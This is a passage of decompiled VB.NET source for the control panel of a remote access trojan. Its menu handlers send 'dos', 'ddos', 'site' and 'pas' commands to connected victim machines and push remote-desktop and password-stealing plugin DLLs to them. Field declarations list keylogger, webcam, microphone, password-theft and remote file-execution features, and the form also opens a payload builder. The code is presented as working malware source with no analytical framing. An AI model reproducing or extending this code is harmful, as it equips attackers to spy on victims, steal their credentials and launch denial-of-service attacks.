					For Each obj As Object In Me.L1.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Try
							NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag), Nothing, "Send", New Object() { String.Concat(New String() { "prof", Class7.string_1, "~", Class7.string_1, "vn", Class7.string_1, Class6.smethod_14(text) }) }, Nothing, Nothing, Nothing, True)
							dataGridViewRow.Cells(Class7.int_0).Value = text + "_" + Strings.Split(Conversions.ToString(RuntimeHelpers.GetObjectValue(dataGridViewRow.Cells(Class7.int_0).Value)), "_", -1, CompareMethod.Binary)(Strings.Split(Conversions.ToString(RuntimeHelpers.GetObjectValue(dataGridViewRow.Cells(Class7.int_0).Value)), "_", -1, CompareMethod.Binary).Length - 1)
						Catch ex As Exception
						End Try
					Next
				Finally
					Dim enumerator As IEnumerator
					flag = (TypeOf enumerator Is IDisposable)
					If flag Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
			End If
		End Sub

		' Token: 0x060001DF RID: 479 RVA: 0x00158B70 File Offset: 0x00156F70
		Private Sub ToolStripStatusLabel3_Click(sender As Object, e As EventArgs)
			MyProject.Forms.Builder.ShowDialog()
		End Sub

		' Token: 0x060001E0 RID: 480 RVA: 0x00158B84 File Offset: 0x00156F84
		Private Sub RemoteDesktopToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L1.SelectedRows.Count <> 0
			If flag Then
				Dim class9_ As Class7.Class9 = Class7.smethod_0("sc2.dll", Nothing)
				Try
					For Each obj As Object In Me.L1.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Class7.smethod_2(CType(dataGridViewRow.Tag, Client), class9_, False)
					Next
				Finally
					Dim enumerator As IEnumerator
					flag = (TypeOf enumerator Is IDisposable)
					If flag Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
			End If
		End Sub

		' Token: 0x060001E1 RID: 481 RVA: 0x00158C28 File Offset: 0x00157028
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Me.int_0 += 1
				Dim flag As Boolean = Me.int_0 = 10
				If flag Then
					Me.int_0 = 0
					Me.upl.Text = "Upload [" + Class6.smethod_17(Class7.long_0) + "]"
					Me.dwn.Text = "Download [" + Class6.smethod_17(Class7.long_1) + "]"
					Class7.long_0 = 0L
					Class7.long_1 = 0L
				End If
				Me.Text = String.Concat(New String() { Class7.string_0, "    Port[ ", Conversions.ToString(Me.port), " ]    Online[ ", Conversions.ToString(Me.L1.RowCount), " ]    Selected[", Conversions.ToString(Me.L1.SelectedRows.Count), "] REQ[", Conversions.ToString(Me.S.REQ.Count), "]" })
				Me.conz.Text = "Connections[" + Conversions.ToString(Me.S.Online.Count) + "]"
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060001E2 RID: 482 RVA: 0x00158DB4 File Offset: 0x001571B4
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			Me.Hide()
		End Sub

		' Token: 0x060001E3 RID: 483 RVA: 0x00158DC0 File Offset: 0x001571C0
		Private Sub DDoSToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.L1.SelectedRows
					Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag), Nothing, "Send", New Object() { "dos" }, Nothing, Nothing, Nothing, True)
				Next
			Finally
				Dim enumerator As IEnumerator
				Dim flag As Boolean = TypeOf enumerator Is IDisposable
				If flag Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
		End Sub

		' Token: 0x060001E4 RID: 484 RVA: 0x00158E58 File Offset: 0x00157258
		Private Sub OpenSitesToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.L1.SelectedRows
					Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag), Nothing, "Send", New Object() { "site" }, Nothing, Nothing, Nothing, True)
				Next
			Finally
				Dim enumerator As IEnumerator
				Dim flag As Boolean = TypeOf enumerator Is IDisposable
				If flag Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
		End Sub

		' Token: 0x060001E5 RID: 485 RVA: 0x00158EF0 File Offset: 0x001572F0
		Private Sub DDoSToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.L1.SelectedRows
					Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag), Nothing, "Send", New Object() { "ddos" }, Nothing, Nothing, Nothing, True)
				Next
			Finally
				Dim enumerator As IEnumerator
				Dim flag As Boolean = TypeOf enumerator Is IDisposable
				If flag Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
		End Sub

		' Token: 0x060001E6 RID: 486 RVA: 0x00158F88 File Offset: 0x00157388
		Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.L1.SelectedRows
					Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag), Nothing, "Send", New Object() { "fun" }, Nothing, Nothing, Nothing, True)
				Next
			Finally
				Dim enumerator As IEnumerator
				Dim flag As Boolean = TypeOf enumerator Is IDisposable
				If flag Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
		End Sub

		' Token: 0x060001E7 RID: 487 RVA: 0x00159020 File Offset: 0x00157420
		Private Sub Plugin2ToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.L1.SelectedRows
					Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag), Nothing, "Send", New Object() { "pas" }, Nothing, Nothing, Nothing, True)
				Next
			Finally
				Dim enumerator As IEnumerator
				Dim flag As Boolean = TypeOf enumerator Is IDisposable
				If flag Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
		End Sub

		' Token: 0x060001E8 RID: 488 RVA: 0x001590B8 File Offset: 0x001574B8
		Private Sub Plugin1ToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L1.SelectedRows.Count <> 0
			If flag Then
				Dim class9_ As Class7.Class9 = Class7.smethod_0("pw.dll", Nothing)
				Try
					For Each obj As Object In Me.L1.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Class7.smethod_2(CType(dataGridViewRow.Tag, Client), class9_, True)
					Next
				Finally
					Dim enumerator As IEnumerator
					flag = (TypeOf enumerator Is IDisposable)
					If flag Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
			End If
		End Sub

		' Token: 0x060001E9 RID: 489 RVA: 0x0015915C File Offset: 0x0015755C
		Private Sub SdfghToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Me.Show()
		End Sub

		' Token: 0x060001EA RID: 490 RVA: 0x00159168 File Offset: 0x00157568
		<MethodImpl(MethodImplOptions.NoInlining Or MethodImplOptions.NoOptimization)>
		Private Sub ExitToolStripMenuItem_Click_1(sender As Object, e As EventArgs)
			ProjectData.EndApp()
		End Sub

		' Token: 0x040000AF RID: 175
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x040000B1 RID: 177
		<AccessedThroughProperty("StatusStrip1")>
		Private _StatusStrip1 As StatusStrip

		' Token: 0x040000B2 RID: 178
		<AccessedThroughProperty("ToolStripStatusLabel1")>
		Private _ToolStripStatusLabel1 As ToolStripStatusLabel

		' Token: 0x040000B3 RID: 179
		<AccessedThroughProperty("ToolStripStatusLabel3")>
		Private _ToolStripStatusLabel3 As ToolStripStatusLabel

		' Token: 0x040000B4 RID: 180
		<AccessedThroughProperty("ToolStripStatusLabel5")>
		Private _ToolStripStatusLabel5 As ToolStripStatusLabel

		' Token: 0x040000B5 RID: 181
		<AccessedThroughProperty("ToolStripStatusLabel4")>
		Private _ToolStripStatusLabel4 As ToolStripStatusLabel

		' Token: 0x040000B6 RID: 182
		<AccessedThroughProperty("conz")>
		Private _conz As ToolStripStatusLabel

		' Token: 0x040000B7 RID: 183
		<AccessedThroughProperty("upl")>
		Private _upl As ToolStripStatusLabel

		' Token: 0x040000B8 RID: 184
		<AccessedThroughProperty("dwn")>
		Private _dwn As ToolStripStatusLabel

		' Token: 0x040000B9 RID: 185
		<AccessedThroughProperty("ContextMenuStrip1")>
		Private _ContextMenuStrip1 As ContextMenuStrip

		' Token: 0x040000BA RID: 186
		<AccessedThroughProperty("ManagerToolStripMenuItem")>
		Private _ManagerToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000BB RID: 187
		<AccessedThroughProperty("RunFileToolStripMenuItem")>
		Private _RunFileToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000BC RID: 188
		<AccessedThroughProperty("FromLinkToolStripMenuItem")>
		Private _FromLinkToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000BD RID: 189
		<AccessedThroughProperty("FromDiskToolStripMenuItem")>
		Private _FromDiskToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000BE RID: 190
		<AccessedThroughProperty("ScriptToolStripMenuItem")>
		Private _ScriptToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000BF RID: 191
		<AccessedThroughProperty("RemoteDesktopToolStripMenuItem")>
		Private _RemoteDesktopToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000C0 RID: 192
		<AccessedThroughProperty("RemoteCamToolStripMenuItem")>
		Private _RemoteCamToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000C1 RID: 193
		<AccessedThroughProperty("MicrophoneToolStripMenuItem")>
		Private _MicrophoneToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000C2 RID: 194
		<AccessedThroughProperty("GetPasswordsToolStripMenuItem")>
		Private _GetPasswordsToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000C3 RID: 195
		<AccessedThroughProperty("KeyloggerToolStripMenuItem")>
		Private _KeyloggerToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000C4 RID: 196
		<AccessedThroughProperty("OpenChatToolStripMenuItem")>
		Private _OpenChatToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000C5 RID: 197
		<AccessedThroughProperty("ServerToolStripMenuItem")>
		Private _ServerToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000C6 RID: 198
		<AccessedThroughProperty("UpdateToolStripMenuItem")>
		Private _UpdateToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000C7 RID: 199
		<AccessedThroughProperty("FromDISKToolStripMenuItem1")>
		Private _FromDISKToolStripMenuItem1 As ToolStripMenuItem

		' Token: 0x040000C8 RID: 200
		<AccessedThroughProperty("FromLINKToolStripMenuItem1")>
		Private _FromLINKToolStripMenuItem1 As ToolStripMenuItem

		' Token: 0x040000C9 RID: 201
		<AccessedThroughProperty("UninstallToolStripMenuItem")>
		Private _UninstallToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000CA RID: 202
		<AccessedThroughProperty("RestartToolStripMenuItem")>
		Private _RestartToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000CB RID: 203
		<AccessedThroughProperty("CloseToolStripMenuItem")>
		Private _CloseToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000CC RID: 204
		<AccessedThroughProperty("DisconnectToolStripMenuItem")>
		Private _DisconnectToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000CD RID: 205
		<AccessedThroughProperty("RenameToolStripMenuItem")>
		Private _RenameToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000CE RID: 206
		<AccessedThroughProperty("OpenFolderToolStripMenuItem")>
		Private _OpenFolderToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000CF RID: 207
		<AccessedThroughProperty("IMG2")>
		Private _IMG2 As ImageList

		' Token: 0x040000D0 RID: 208
		<AccessedThroughProperty("NotifyIcon1")>
		Private _NotifyIcon1 As NotifyIcon

		' Token: 0x040000D1 RID: 209
		<AccessedThroughProperty("L1")>
		Private _L1 As L1

		' Token: 0x040000D2 RID: 210
		<AccessedThroughProperty("Pp1")>
		Private _Pp1 As Pp1

		' Token: 0x040000D3 RID: 211
		<AccessedThroughProperty("Timer1")>
		Private _Timer1 As System.Windows.Forms.Timer

		' Token: 0x040000D4 RID: 212
		<AccessedThroughProperty("Button1")>
		Private _Button1 As Button

		' Token: 0x040000D5 RID: 213
		<AccessedThroughProperty("OpenSitesToolStripMenuItem")>
		Private _OpenSitesToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000D6 RID: 214
		<AccessedThroughProperty("DDoSToolStripMenuItem")>
		Private _DDoSToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000D7 RID: 215
		<AccessedThroughProperty("ToolStripMenuItem1")>
		Private _ToolStripMenuItem1 As ToolStripMenuItem

		' Token: 0x040000D8 RID: 216
		<AccessedThroughProperty("Plugin1ToolStripMenuItem")>
		Private _Plugin1ToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000D9 RID: 217
		<AccessedThroughProperty("Plugin2ToolStripMenuItem")>
		Private _Plugin2ToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000DA RID: 218
		<AccessedThroughProperty("ContextMenuStrip2")>
		Private _ContextMenuStrip2 As ContextMenuStrip

		' Token: 0x040000DB RID: 219
		<AccessedThroughProperty("SdfghToolStripMenuItem")>
		Private _SdfghToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000DC RID: 220
		<AccessedThroughProperty("ToolStripSeparator1")>
		Private _ToolStripSeparator1 As ToolStripSeparator

		' Token: 0x040000DD RID: 221
		<AccessedThroughProperty("ExitToolStripMenuItem")>
		Private _ExitToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040000DE RID: 222
		Private int_0 As Integer

		' Token: 0x040000DF RID: 223
		Public isActive As Boolean

		' Token: 0x040000E0 RID: 224
		Public port As Integer

		' Token: 0x040000E1 RID: 225
		Public S As SK

		' Token: 0x040000E2 RID: 226
		Public Yy As Object
	End Class
End Namespace
